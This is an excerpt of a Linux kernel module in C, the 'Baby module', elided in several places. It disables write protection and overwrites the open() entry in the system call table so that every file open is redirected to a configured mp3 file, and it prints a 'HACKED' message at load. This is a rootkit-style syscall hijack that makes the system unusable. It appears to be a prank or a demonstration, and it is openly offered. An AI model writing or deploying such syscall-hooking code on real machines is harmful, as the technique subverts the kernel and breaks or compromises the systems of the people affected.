...
MODULE_LICENSE("GPL");
MODULE_AUTHOR("DAVID DHAS");
MODULE_DESCRIPTION("Baby module");

static char *baby_filename = "/home/david/Downloads/baby.mp3";
/*
 ...
 * the module.
 */
module_param(baby_filename, charp, S_IRUSR | S_IWUSR | S_IRGRP | S_IROTH);
MODULE_PARM_DESC(baby_filename, "The location of the baby file");
...
asmlinkage long baby_open(const char __user *filename, int flags, umode_t mode);
...
static int __init baby_init(void)
{
    ...
    sys_call_table[__NR_open] = (unsigned long *) baby_open;
    ENABLE_WRITE_PROTECTION;

    printk(KERN_INFO "HACKED:It's gonna be Baby time!!!\n");
...
asmlinkage long baby_open(const char __user *filename, int flags, umode_t mode)
{
	 ...
	 * and place the baby filename at the location the user code passed
	 * in, saving and restoring the memory we overwrite.
	 */
	old_fs = get_fs();
	set_fs(KERNEL_DS);

	/* Open the baby file instead */
	fd = (*original_sys_open)(baby_filename, flags, mode);
...
static void __exit baby_cleanup(void)
{
